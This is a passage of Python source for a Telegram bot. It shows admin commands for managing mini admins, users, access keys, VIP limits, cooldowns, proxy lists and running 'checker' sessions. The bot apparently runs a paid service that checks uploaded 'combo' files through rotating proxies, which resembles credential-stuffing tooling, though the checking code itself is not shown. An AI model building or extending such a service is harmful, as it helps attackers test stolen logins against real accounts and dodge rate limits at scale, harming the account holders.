                for p in final_perms if p in perm_to_cmd]
    try:
        await context.bot.set_my_commands(
            base_cmds+extra_cmds[:50],
            scope=BotCommandScopeChat(chat_id=int(target_uid)))
    except: pass

    try:
        await context.bot.send_message(chat_id=int(target_uid),parse_mode=ParseMode.HTML,
            text=f" <b>Mini Admin Access Granted!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                 f"You now have Mini Admin access.\n\n"
                 f" <b>Your Permissions:</b>\n{perms_str}\n\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n"
                 f" Use /miniadminpanel to view your panel.\n"
                 f" Restart Telegram if commands don't appear yet.")
    except: pass

@admin_only
async def cmd_remove_mini_admin(update, context):
    """/removeminiadmin <user_id>"""
    if not context.args:
        await update.message.reply_text(
            "Usage: <code>/removeminiadmin &lt;user_id&gt;</code>",parse_mode=ParseMode.HTML); return
    target_uid=context.args[0].strip(); ma=load_mini_admins()
    if target_uid not in ma:
        await update.message.reply_text(f" <code>{target_uid}</code> is not a mini admin.",parse_mode=ParseMode.HTML); return
    ma[target_uid]["active"]=False; ma[target_uid]["removed_at"]=datetime.now(timezone.utc).isoformat()
    save_mini_admins(ma); uname_r=ma[target_uid].get("username","?")
    await update.message.reply_text(
        f" <b>Mini Admin Removed</b>\n<code>{target_uid}</code> @{uname_r}\nAccess revoked.",
        parse_mode=ParseMode.HTML)
    try:
        await context.bot.send_message(chat_id=int(target_uid),parse_mode=ParseMode.HTML,
            text=" <b>Mini Admin Access Revoked</b>\nYour mini admin access has been removed.")
    except: pass

@admin_only
async def cmd_mini_admin_list(update, context):
    """List all mini admins."""
    ma=load_mini_admins()
    if not ma:
        await update.message.reply_text(" No mini admins added yet.",parse_mode=ParseMode.HTML); return
    lines=[" <b>Mini Admin List</b>\n━━━━━━━━━━━━━━━━━━━━"]
    for uid2,md in ma.items():
        icon="" if md.get("active") else ""
        perms_s=", ".join(f"<code>{p}</code>" for p in md.get("permissions",[])) or "none"
        lines.append(f"{icon} <b>{md.get('first_name','?')}</b> @{md.get('username','?')} "
                     f"(<code>{uid2}</code>)\n"
                     f"    Perms: {perms_s}\n"
                     f"    Actions: <code>{md.get('total_actions',0)}</code>")
    msg="\n\n".join(lines)
    for chunk in [msg[i:i+4096] for i in range(0,len(msg),4096)]:
        await update.message.reply_text(chunk,parse_mode=ParseMode.HTML)

@admin_only
async def cmd_mini_admin_info(update, context):
    """/miniadmininfo <user_id> — view full activity log"""
    if not context.args:
        await update.message.reply_text(
            "Usage: <code>/miniadmininfo &lt;user_id&gt;</code>",parse_mode=ParseMode.HTML); return
    target_uid=context.args[0].strip(); ma=load_mini_admins()
    if target_uid not in ma:
        await update.message.reply_text(
            f" <code>{target_uid}</code> is not a mini admin.",parse_mode=ParseMode.HTML); return
    md=ma[target_uid]
    status_s=" Active" if md.get("active") else " Revoked"
    perms_s="\n".join(f"   <code>{p}</code> — {MINI_ADMIN_PERM_MAP.get(p,'')}"
                        for p in md.get("permissions",[])) or "  none"
    header=(f" <b>Mini Admin Info</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f" Name    : <b>{md.get('first_name','?')}</b> @{md.get('username','?')}\n"
            f"🆔 ID      : <code>{target_uid}</code>\n"
            f" Added   : <code>{md.get('added_at','?')[:10]}</code>\n"
            f" Status  : {status_s}\n"
            f" Actions : <code>{md.get('total_actions',0)}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" <b>Permissions:</b>\n{perms_s}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n")
    log_entries=md.get("action_log",[])
    if not log_entries:
        await update.message.reply_text(header+" No actions logged yet.",parse_mode=ParseMode.HTML); return
    log_lines=[" <b>Recent Actions (latest 30):</b>"]
    for i,entry in enumerate(reversed(log_entries[-30:]),1):
        at=entry.get("at","?")[:16].replace("T"," ")
        detail=entry.get("detail","")
        detail_str=f" — <code>{detail[:60]}</code>" if detail else ""
        log_lines.append(f"<code>{i:02d}.</code> <code>{entry.get('action','?')}</code>{detail_str}\n"
                        f"      {at} UTC")
    full=header+"\n".join(log_lines)
    for chunk in [full[i:i+4096] for i in range(0,len(full),4096)]:
        await update.message.reply_text(chunk,parse_mode=ParseMode.HTML)

# ── Mini admin self-panel ──────────────────────────────────────────────────
async def cmd_mini_admin_self_panel(update, context):
    """/miniadminpanel without args for non-admin users → show their own panel"""
    tg=update.effective_user; uid=str(tg.id); cfg=load_config()
    # If admin, handled by cmd_mini_admin_panel above (it already shows help)
    if is_admin(tg.id,cfg):
        await cmd_mini_admin_panel(update,context); return
    if not is_mini_admin(tg.id):
        await update.message.reply_text(" You don't have mini admin access."); return
    ma=load_mini_admins(); md=ma.get(uid,{})
    if not md.get("active"):
        await update.message.reply_text(" Your mini admin access has been revoked."); return
    perms=md.get("permissions",[])
    perms_str="\n".join(f"   <code>{p}</code> — {MINI_ADMIN_PERM_MAP.get(p,'')}"
                          for p in perms) or "   None"
    total_act=md.get("total_actions",0)
    recent_log=md.get("action_log",[])[-5:]
    recent=""
    for entry in reversed(recent_log):
        at=entry.get("at","?")[:16].replace("T"," ")
        detail=entry.get("detail","")
        ds=f": <code>{detail[:50]}</code>" if detail else ""
        recent+=f"• <code>{entry.get('action','?')}</code>{ds} ({at})\n"
    await update.message.reply_text(
        f" <b>Mini Admin Panel</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Name     : <b>{tg.first_name}</b>\n"
        f"🆔 ID       : <code>{uid}</code>\n"
        f" Actions  : <code>{total_act}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" <b>Your Permissions:</b>\n{perms_str}\n"
        +(f"━━━━━━━━━━━━━━━━━━━━\n <b>Recent Actions:</b>\n{recent}" if recent else ""),
        parse_mode=ParseMode.HTML)

# ── Admin-only commands not requiring mini permissions ────────────────────
@admin_only
async def cmd_check_all_users(update,context):
    users=load_users()
    if not users: await update.message.reply_text(" No users yet."); return
    ac=sum(1 for u in users.values() if u.get("activated"))
    bc=sum(1 for u in users.values() if u.get("banned"))
    vc=sum(1 for u in users.values() if u.get("vip"))
    lines=[f" <b>Users ({len(users)})</b>",f"{ac}  {bc}  {vc}","━━━━━━━━━━━━━━━━━━━━"]
    for uid2,u in sorted(users.items(),key=lambda x:x[1].get("joined",""),reverse=True):
        st=" BANNED" if u.get("banned") else (" VIP" if u.get("vip") else (" Active" if u.get("activated") else " No Key"))
        exp=f" | {fmt_expiry(u.get('key_expires_at'))}" if u.get("activated") and not u.get("vip") else ""
        lines.append(f"• <code>{uid2}</code> @{u.get('username','?')}\n  {st} | <code>{u.get('total_checked',0):,}</code>{exp}")
    msg="\n".join(lines)
    for chunk in [msg[i:i+4096] for i in range(0,len(msg),4096)]: await update.message.reply_text(chunk,parse_mode=ParseMode.HTML)

# ── Admin commands with mini permissions ──────────────────────────────────
@admin_or_mini_admin('stats')
async def cmd_stats(update,context):
    cfg=load_config(); users=load_users(); keys=load_keys()
    tu=len(users); au=sum(1 for u in users.values() if u.get("activated"))
    eu=sum(1 for u in users.values() if u.get("activated") and key_expired(u.get("key_expires_at")))
    bu=sum(1 for u in users.values() if u.get("banned")); vu=sum(1 for u in users.values() if u.get("vip"))
    tc=sum(u.get("total_checked",0) for u in users.values())
    with sessions_lock: live=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
    with _queue_lock: waiting=len(_checker_queue)
    pf=list(PROXY_DIR.glob("*.txt")); tp=0
    for f in pf:
        try:
            with open(f,"r",encoding="utf-8",errors="ignore") as fh:
                tp+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
        except: pass
    cds=cfg.get("cooldown_sessions"); cdm=cfg.get("cooldown_minutes",30)
    cd_str=f"{cds} sessions → {cdm}min" if cds else "Off"
    await update.message.reply_text(
        f" <b>Bot Statistics</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Total Users   : <code>{tu}</code>\n Activated     : <code>{au}</code>\n"
        f" Expired keys  : <code>{eu}</code>\n Banned        : <code>{bu}</code>\n VIP           : <code>{vu}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" Running       : <code>{live}/{MAX_CONCURRENT_CHECKERS}</code> slots\n"
        f" In queue      : <code>{waiting}</code>\n Total checked : <code>{tc:,}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" Keys total    : <code>{len(keys)}</code>\n"
        f" Keys used     : <code>{sum(1 for k in keys.values() if k.get('used_by'))}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" Proxy files   : <code>{len(pf)}</code>  ({tp:,} proxies)\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" Locked        : <code>{'YES ' if cfg.get('locked') else 'No '}</code>\n"
        f" Regular limit : <code>{cfg.get('global_limit') or 'Unlimited'}</code>\n"
        f" VIP limit     : <code>{cfg.get('vip_limit') or 'Unlimited'}</code>\n"
        f" Cooldown      : <code>{cd_str}</code>",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('broadcast')
async def cmd_broadcast(update,context):
    if not context.args: await update.message.reply_text("Usage: <code>/broadcast Your message</code>",parse_mode=ParseMode.HTML); return
    msg=" ".join(context.args); users=load_users()
    bt=(f" <b>Announcement</b>\n━━━━━━━━━━━━━━━━━━━━\n{msg}")
    ok=fail=0
    sm=await update.message.reply_text(f" Broadcasting to <code>{len(users)}</code> users…",parse_mode=ParseMode.HTML)
    for uid2 in users:
        try: await context.bot.send_message(chat_id=int(uid2),text=bt,parse_mode=ParseMode.HTML); ok+=1
        except: fail+=1
        await asyncio.sleep(0.05)
    await sm.edit_text(f" <b>Done!</b>  {ok} sent   {fail} failed",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('setlimit')
async def cmd_set_limit(update,context):
    cfg=load_config()
    if not context.args:
        await update.message.reply_text(
            f" <b>Regular User Line Limit</b>\nCurrent: <code>{cfg.get('global_limit') or 'Unlimited'}</code>\n"
            f"<code>/setlimit 1000</code>  |  <code>/setlimit off</code>",parse_mode=ParseMode.HTML); return
    arg=context.args[0].lower()
    if arg=="off": cfg["global_limit"]=None; save_config(cfg); await update.message.reply_text(" Regular limit removed.",parse_mode=ParseMode.HTML); return
    try:
        n=int(arg)
        if n<1: raise ValueError
        cfg["global_limit"]=n; save_config(cfg)
        await update.message.reply_text(f" Regular limit: <code>{n:,}</code> lines.",parse_mode=ParseMode.HTML)
    except: await update.message.reply_text(" Use a number or <code>off</code>.",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('setlimitforvip')
async def cmd_set_limit_vip(update,context):
    cfg=load_config()
    if not context.args:
        await update.message.reply_text(
            f" <b>VIP Line Limit</b>\nVIP limit: <code>{cfg.get('vip_limit') or 'Unlimited'}</code>\n"
            f"Regular: <code>{cfg.get('global_limit') or 'Unlimited'}</code>\n"
            f"<code>/setlimitforvip 5000</code>  |  <code>/setlimitforvip off</code>",parse_mode=ParseMode.HTML); return
    arg=context.args[0].lower()
    if arg=="off": cfg["vip_limit"]=None; save_config(cfg); await update.message.reply_text(" VIP limit removed (unlimited).",parse_mode=ParseMode.HTML); return
    try:
        n=int(arg)
        if n<1: raise ValueError
        cfg["vip_limit"]=n; save_config(cfg)
        await update.message.reply_text(f" VIP limit: <code>{n:,}</code> lines.",parse_mode=ParseMode.HTML)
    except: await update.message.reply_text(" Use a number or <code>off</code>.",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('setcd')
async def cmd_set_cd(update,context):
    cfg=load_config()
    if not context.args:
        cs=cfg.get("cooldown_sessions"); cm=cfg.get("cooldown_minutes",30)
        await update.message.reply_text(
            f" <b>Cooldown</b>\nSessions: <code>{'Off' if not cs else cs}</code>  Duration: <code>{cm}min</code>\n"
            f"<code>/setcd 5 30</code>  → after 5 sessions wait 30min\n<code>/setcd off</code>  → disable\n"
            f"<i> VIP bypass cooldown always.</i>",parse_mode=ParseMode.HTML); return
    if context.args[0].lower()=="off":
        cfg["cooldown_sessions"]=None; save_config(cfg)
        await update.message.reply_text(" <b>Cooldown disabled.</b>",parse_mode=ParseMode.HTML); return
    if len(context.args)<2:
        await update.message.reply_text("Usage: <code>/setcd &lt;sessions&gt; &lt;minutes&gt;</code>",parse_mode=ParseMode.HTML); return
    try:
        s=int(context.args[0]); m=int(context.args[1])
        if s<1 or m<1: raise ValueError
        cfg["cooldown_sessions"]=s; cfg["cooldown_minutes"]=m; save_config(cfg)
        await update.message.reply_text(f" Cooldown: after <code>{s}</code> sessions → wait <code>{m}</code>min\n VIP exempt.",parse_mode=ParseMode.HTML)
    except: await update.message.reply_text(" Example: <code>/setcd 5 30</code>",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('setconcurrent')
async def cmd_set_concurrent(update,context):
    if not context.args:
        await update.message.reply_text(
            f" <b>Max Concurrent Checkers</b>\nCurrent: <code>{MAX_CONCURRENT_CHECKERS}</code>\n"
            f"<code>/setconcurrent 10</code>  (range: 1–50)\n<i>1 per 512MB RAM recommended.</i>",parse_mode=ParseMode.HTML); return
    try:
        n=int(context.args[0])
        if n<1 or n>50: raise ValueError
    except: await update.message.reply_text(" Use a number 1–50.",parse_mode=ParseMode.HTML); return
    old=MAX_CONCURRENT_CHECKERS; rebuild_semaphore(n)
    cfg=load_config(); cfg["max_concurrent"]=n; save_config(cfg)
    await update.message.reply_text(f" Updated: <code>{old}</code> → <code>{n}</code> simultaneous checkers.",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('upload_proxy')
async def cmd_upload_proxy(update,context):
    uid=str(update.effective_user.id)
    with sessions_lock: active_sessions.setdefault(uid,{}); active_sessions[uid]["awaiting_proxy"]=True
    await update.message.reply_text(
        " <b>Upload Proxy File</b>\n━━━━━━━━━━━━━━━━━━━━\nSend a <code>.txt</code> file now.\nOne proxy per line:\n"
        "<code>host:port</code>\n<code>host:port:user:pass</code>\n<code>http://host:port</code>\n<code>socks5://host:port</code>",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('proxystatus')
async def cmd_proxy_status(update,context):
    pf=sorted(PROXY_DIR.glob("*.txt"))
    if not pf: await update.message.reply_text(" No proxy files.\nUse <code>/upload_proxy</code>.",parse_mode=ParseMode.HTML); return
    total=0; lines=[" <b>Proxy Files</b>\n━━━━━━━━━━━━━━━━━━━━"]
    for p in pf:
        try:
            with open(p,"r",encoding="utf-8",errors="ignore") as f:
                cnt=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
            sz=p.stat().st_size; ss=f"{sz/1024:.1f}KB" if sz<1024*1024 else f"{sz/1024/1024:.1f}MB"
            total+=cnt; lines.append(f" <code>{p.name}</code>\n    {cnt:,} proxies  ·  {ss}")
        except: lines.append(f" <code>{p.name}</code>   unreadable")
    lines+=[f"━━━━━━━━━━━━━━━━━━━━",f" Total: <code>{total:,}</code> in <code>{len(pf)}</code> file(s)"]
    await update.message.reply_text("\n".join(lines),parse_mode=ParseMode.HTML)

@admin_or_mini_admin('removeproxy')
async def cmd_remove_proxy(update,context):
    pf=sorted(PROXY_DIR.glob("*.txt"))
    if not pf:
        await update.message.reply_text(" No proxy files.\nUse <code>/upload_proxy</code> to add one.",parse_mode=ParseMode.HTML); return
    lines=[" <b>Proxy Files</b> — tap a button to delete:\n━━━━━━━━━━━━━━━━━━━━"]
    btns=[]
    for p in pf:
        try:
            with open(p,"r",encoding="utf-8",errors="ignore") as f:
                cnt=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
            sz=p.stat().st_size; ss=f"{sz/1024:.1f}KB" if sz<1024*1024 else f"{sz/1024/1024:.1f}MB"
            lines.append(f" <code>{p.name}</code>  ({cnt:,} proxies · {ss})")
        except: lines.append(f" <code>{p.name}</code>   unreadable")
        btns.append([InlineKeyboardButton(f" Delete  {p.name}",callback_data=f"delproxy_{p.name}")])
    btns.append([InlineKeyboardButton(" Delete ALL proxy files",callback_data="delproxy_ALL")])
    lines.append(f"━━━━━━━━━━━━━━━━━━━━\nTotal: <code>{len(pf)}</code> file(s)")
    await update.message.reply_text("\n".join(lines),reply_markup=InlineKeyboardMarkup(btns),parse_mode=ParseMode.HTML)

@admin_or_mini_admin('checkproxy')
async def cmd_check_proxy(update,context):
    """
    /checkproxy              — list proxy files with buttons
    /checkproxy file.txt     — show options for that file
    /checkproxy file.txt sample — test 5 spread lines
    /checkproxy file.txt all    — test ALL lines (concurrent)
    /checkproxy file.txt 5      — test line #5
    """
    from concurrent.futures import ThreadPoolExecutor as _TPE,as_completed as _asc
    args=context.args or []
    pf=sorted(PROXY_DIR.glob("*.txt"))

    if not args:
        if not pf:
            await update.message.reply_text(" No proxy files.",parse_mode=ParseMode.HTML); return
        lines_out=[" <b>Proxy Files</b>\n━━━━━━━━━━━━━━━━━━━━"]
        btns=[]
        for p in pf:
            try:
                with open(p,"r",encoding="utf-8",errors="ignore") as f:
                    cnt=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
                sz=p.stat().st_size; ss=f"{sz/1024:.1f}KB" if sz<1024*1024 else f"{sz/1024/1024:.1f}MB"
                lines_out.append(f" <code>{p.name}</code>  ·  {cnt:,} proxies  ·  {ss}")
            except: lines_out.append(f" <code>{p.name}</code>")
            btns.append([InlineKeyboardButton(f" {p.name}",callback_data=f"chkprx_menu_{p.name}")])
        lines_out.append("━━━━━━━━━━━━━━━━━━━━\nTap a file to check it.")
        await update.message.reply_text("\n".join(lines_out),
            reply_markup=InlineKeyboardMarkup(btns),parse_mode=ParseMode.HTML)
        return

    fname=args[0]; fpath=PROXY_DIR/fname
    if not fpath.exists():
        await update.message.reply_text(f" File not found: <code>{fname}</code>",parse_mode=ParseMode.HTML); return
    with open(fpath,"r",encoding="utf-8",errors="ignore") as f:
        all_lines=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
    total=len(all_lines)
    if total==0:
        await update.message.reply_text(f" <code>{fname}</code> is empty.",parse_mode=ParseMode.HTML); return
    mode=args[1].lower() if len(args)>1 else None

    if mode is None:
        kb=InlineKeyboardMarkup([
            [InlineKeyboardButton(" Sample (5)",callback_data=f"chkprx_sample_{fname}")],
            [InlineKeyboardButton(" Check ALL",callback_data=f"chkprx_all_{fname}")],
            [InlineKeyboardButton(" Specific line…",callback_data=f"chkprx_askline_{fname}")],
        ])
        await update.message.reply_text(
            f" <b>{fname}</b>  ·  <code>{total:,}</code> proxies\n━━━━━━━━━━━━━━━━━━━━\nChoose mode:",
            reply_markup=kb,parse_mode=ParseMode.HTML)
        return

    if mode=="sample":
        idx=[0,total//4,total//2,3*total//4,total-1]
        sample=[all_lines[i] for i in dict.fromkeys(idx) if i<total][:5]
        msg=await update.message.reply_text(
            f" Checking {len(sample)} sample proxies from <code>{fname}</code>…",parse_mode=ParseMode.HTML)
        results=[]
        loop=asyncio.get_event_loop()
        for ln in sample:
            ok_s,_=await loop.run_in_executor(None,_test_proxy_sync,ln)
            results.append(f"{'' if ok_s else ''} Line {all_lines.index(ln)+1}: <code>{ln[:55]}</code>")
        working=sum(1 for r in results if r.startswith(""))
        out=(f"{'' if working==len(sample) else '' if working>0 else ''} <b>{fname}</b> — {working}/{len(sample)} working\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"+"\n".join(results))
        try: await msg.edit_text(out,parse_mode=ParseMode.HTML)
        except: await update.message.reply_text(out,parse_mode=ParseMode.HTML)
        return

    if mode=="all":
        msg=await update.message.reply_text(
            f" Checking ALL <code>{total:,}</code> proxies from <code>{fname}</code>…\nThis may take a while.",
            parse_mode=ParseMode.HTML)
        results_map={}
        def _ci(il):
            i,ln=il; ok_r,err_r=_test_proxy_sync(ln); return i,ln,ok_r,err_r
        with _TPE(max_workers=20) as ex:
            futs={ex.submit(_ci,(i,ln)):i for i,ln in enumerate(all_lines,1)}
            for fut in _asc(futs):
                try:
                    i,ln,ok_r,err_r=fut.result(); results_map[i]=(ln,ok_r,err_r)
                except: pass
        working_l=[(i,ln) for i,(ln,ok_r,_) in sorted(results_map.items()) if ok_r]
        dead_l   =[(i,ln,err_r) for i,(ln,ok_r,err_r) in sorted(results_map.items()) if not ok_r]
        tok=len(working_l); pct=int(tok/total*100) if total else 0
        out_lines=[
            f"{'' if pct>=80 else ''} <b>{fname}</b> — {tok}/{total} working ({pct}%)",
            f"━━━━━━━━━━━━━━━━━━━━",
            f" Working   : <code>{tok:,}</code>",
            f" Dead/Error: <code>{len(dead_l):,}</code>",
        ]
        if dead_l:
            from collections import Counter as _Ctr2
            err_ctr2=_Ctr2(err_r for _,_,err_r in dead_l if err_r)
            if err_ctr2:
                out_lines.append(f" Errors: {', '.join(f'{v}x {k}' for k,v in err_ctr2.most_common(4))}")
            out_lines.append("━━━━━━━━━━━━━━━━━━━━")
            dp="\n".join(f"   Line {i}: <code>{ln[:45]}</code> — {err_r}" for i,ln,err_r in dead_l[:15])
            if len(dead_l)>15: dp+=f"\n  … and {len(dead_l)-15} more"
            out_lines+=["<b>Dead / Error proxies:</b>",dp,"━━━━━━━━━━━━━━━━━━━━"]
        kb2=None
        if dead_l:
            kb2=InlineKeyboardMarkup([
                [InlineKeyboardButton(f" Remove {len(dead_l):,} dead/error (this file)",
                                     callback_data=f"chkprx_rmdeadlines_{fname}")],
                [InlineKeyboardButton(f" Remove dead/error from ALL files",
                                     callback_data="chkprx_rmdeadlines_ALL_")],
            ])
        full="\n".join(out_lines)
        if len(full)>4000: full=full[:4000]+"…"
        try: await msg.edit_text(full,reply_markup=kb2,parse_mode=ParseMode.HTML)
        except: await update.message.reply_text(full,reply_markup=kb2,parse_mode=ParseMode.HTML)
        return

    # Specific line number
    try:
        line_num=int(mode)
        if line_num<1 or line_num>total:
            await update.message.reply_text(f" Line {line_num} out of range (1–{total:,}).",parse_mode=ParseMode.HTML); return
        ln=all_lines[line_num-1]
        msg=await update.message.reply_text(
            f" Checking line <code>{line_num}</code> of <code>{fname}</code>…",parse_mode=ParseMode.HTML)
        ok_ln,_=await asyncio.get_event_loop().run_in_executor(None,_test_proxy_sync,ln)
        out=f"{' Working' if ok_ln else ' Dead/Error'}  — Line {line_num}\n━━━━━━━━━━━━━━━━━━━━\n<code>{ln}</code>"
        try: await msg.edit_text(out,parse_mode=ParseMode.HTML)
        except: await update.message.reply_text(out,parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(
            f" Unknown mode <code>{mode}</code>. Use: sample | all | line_number",
            parse_mode=ParseMode.HTML)

@admin_or_mini_admin('pasteproxy')
async def cmd_paste_proxy(update,context):
    """Set admin as awaiting pasted proxy lines."""
    uid=str(update.effective_user.id)
    with sessions_lock:
        active_sessions.setdefault(uid,{})
        active_sessions[uid]["awaiting_proxy_paste"]=True
    await update.message.reply_text(
        " <b>Paste Proxy Lines</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        "Paste your proxies now (one per line).\n"
        "Supported formats:\n"
        "<code>host:port</code>\n"
        "<code>host:port:user:pass</code>\n"
        "<code>http://host:port</code>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "I'll save them to a new file in the proxy folder automatically.",
        parse_mode=ParseMode.HTML)

@admin_only
async def cmd_send_data(update, context):
    """
    /senddata              — send ALL data files as individual messages
    /senddata config       — send only config.json
    /senddata users        — send only users.json
    /senddata keys         — send only keys.json
    /senddata sessions     — send only sessions_persist.json
    /senddata miniadmins   — send only mini_admins.json
    """
    DATA_FILES = {
        "config":     CONFIG_FILE,
        "users":      USERS_FILE,
        "keys":       KEYS_FILE,
        "sessions":   SESSIONS_FILE,
        "miniadmins": MINI_ADMINS_FILE,
    }

    arg = context.args[0].strip().lower() if context.args else None

    async def _send_file(path: Path, label: str):
        if not path.exists():
            await update.message.reply_text(
                f" <b>{label}</b> does not exist yet.", parse_mode=ParseMode.HTML)
            return
        size = path.stat().st_size
        size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/1024/1024:.2f} MB"
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            pretty = json.dumps(data, indent=2, ensure_ascii=False)
            bio = io.BytesIO(pretty.encode("utf-8"))
            bio.name = path.name
        except Exception:
            bio = open(path, "rb")
        try:
            await update.message.reply_document(
                document=bio,
                filename=path.name,
                caption=(f" <b>{path.name}</b>\n"
                         f" Size: <code>{size_str}</code>\n"
                         f" <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"),
                parse_mode=ParseMode.HTML)
        except Exception as e:
            await update.message.reply_text(
                f" Failed to send <code>{path.name}</code>: {e}",
                parse_mode=ParseMode.HTML)
        finally:
            if hasattr(bio, 'close'): bio.close()

    if arg:
        if arg not in DATA_FILES:
            valid = ", ".join(f"<code>{k}</code>" for k in DATA_FILES)
            await update.message.reply_text(
                f" Unknown file: <code>{arg}</code>\n"
                f"Valid options: {valid}\n"
                f"Or use <code>/senddata</code> (no args) to send all.",
                parse_mode=ParseMode.HTML)
            return
        await _send_file(DATA_FILES[arg], arg)
    else:
        msg = await update.message.reply_text(
            f" Sending <code>{len(DATA_FILES)}</code> data files…",
            parse_mode=ParseMode.HTML)
        for label, path in DATA_FILES.items():
            await _send_file(path, label)
        try: await msg.delete()
        except: pass

@admin_only
async def cmd_reload_bot(update,context):
    """Fully restart the bot process (uses os.execv to replace current process)."""
    await update.message.reply_text(
        " <b>Restarting bot…</b>\nWill be back in a few seconds.",
        parse_mode=ParseMode.HTML)
    import os, sys
    await asyncio.sleep(1.5)
    os.execv(sys.executable, [sys.executable] + sys.argv)

@admin_or_mini_admin('refresh')
async def cmd_refresh(update,context):
    """Reload config, proxy list, and limits live — no restart needed."""
    cfg=load_config()
    saved_mc=cfg.get("max_concurrent",5)
    if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
    try:
        geo_rotator.__init__()
        proxy_status=f" Reloaded ({geo_rotator.total} proxies)"
    except Exception as e:
        proxy_status=f" {e}"
    with sessions_lock:
        live=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
    gl=cfg.get("global_limit") or "Unlimited"
    vl=cfg.get("vip_limit") or "Unlimited"
    thr=cfg.get("default_threads",5)
    mc=cfg.get("max_concurrent",5)
    await update.message.reply_text(
        f" <b>Bot Refreshed!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Proxy        : {proxy_status}\n"
        f" Regular limit: <code>{gl}</code>\n"
        f" VIP limit    : <code>{vl}</code>\n"
        f" Threads      : <code>{thr}</code>\n"
        f" Max concurrent: <code>{mc}</code>\n"
        f" Locked       : <code>{'Yes ' if cfg.get('locked') else 'No '}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" Running: <code>{live}</code> active session(s)",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('stopchecking')
async def cmd_stop_checking(update,context):
    """Show stop options menu."""
    with sessions_lock:
        running=[(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    if not running:
        await update.message.reply_text(" No active sessions.",parse_mode=ParseMode.HTML); return
    users_db=load_users()
    vip_cnt  = sum(1 for uid2,_ in running if users_db.get(uid2,{}).get("vip"))
    nvip_cnt = len(running)-vip_cnt
    kb=InlineKeyboardMarkup([
        [InlineKeyboardButton(f" Stop ALL ({len(running)})",      callback_data="admstop_all")],
        [InlineKeyboardButton(f" Stop Non-VIP ({nvip_cnt})",      callback_data="admstop_nonvip"),
         InlineKeyboardButton(f" Stop VIP ({vip_cnt})",           callback_data="admstop_vip")],
        [InlineKeyboardButton(f" Stop One User…",                  callback_data="admstop_oneuser")],
    ])
    await update.message.reply_text(
        f" <b>Stop Checking</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Running  : <code>{len(running)}</code>\n"
        f" VIP      : <code>{vip_cnt}</code>\n"
        f" Non-VIP  : <code>{nvip_cnt}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\nChoose who to stop:",
        reply_markup=kb, parse_mode=ParseMode.HTML)

@admin_or_mini_admin('continuechecking')
async def cmd_continue_checking(update,context):
    """Show continue options menu."""
    with sessions_lock:
        stopped=[(uid2,s) for uid2,s in active_sessions.items()
                 if s.get("status")=="stopped_by_admin" and s.get("file") and Path(s["file"]).exists()]
    if not stopped:
        await update.message.reply_text(" No admin-stopped sessions to resume.",parse_mode=ParseMode.HTML); return
    users_db=load_users()
    vip_cnt  = sum(1 for uid2,_ in stopped if users_db.get(uid2,{}).get("vip"))
    nvip_cnt = len(stopped)-vip_cnt
    kb=InlineKeyboardMarkup([
        [InlineKeyboardButton(f" Continue ALL ({len(stopped)})",  callback_data="admcont_all")],
        [InlineKeyboardButton(f" Continue Non-VIP ({nvip_cnt})", callback_data="admcont_nonvip"),
         InlineKeyboardButton(f" Continue VIP ({vip_cnt})",      callback_data="admcont_vip")],
        [InlineKeyboardButton(f" Continue One User…",             callback_data="admcont_oneuser")],
    ])
    await update.message.reply_text(
        f" <b>Continue Checking</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Admin-stopped : <code>{len(stopped)}</code>\n"
        f" VIP           : <code>{vip_cnt}</code>\n"
        f" Non-VIP       : <code>{nvip_cnt}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\nChoose who to continue:",
        reply_markup=kb, parse_mode=ParseMode.HTML)

@admin_only
async def cmd_stop_for_user(update,context):
    """Show running users with individual stop buttons."""
    with sessions_lock:
        running=[(uid2,dict(s)) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    if not running:
        await update.message.reply_text(" No active sessions.",parse_mode=ParseMode.HTML); return
    users_db=load_users(); lines=[" <b>Stop a User</b>\n━━━━━━━━━━━━━━━━━━━━"]; btns=[]
    for uid2,s in running:
        udata=users_db.get(uid2,{}); uname=udata.get("username","?"); fname_u=udata.get("first_name","?")
        vip_tag="" if udata.get("vip") else ""
        combo=Path(s.get("file","")).name if s.get("file") else "N/A"
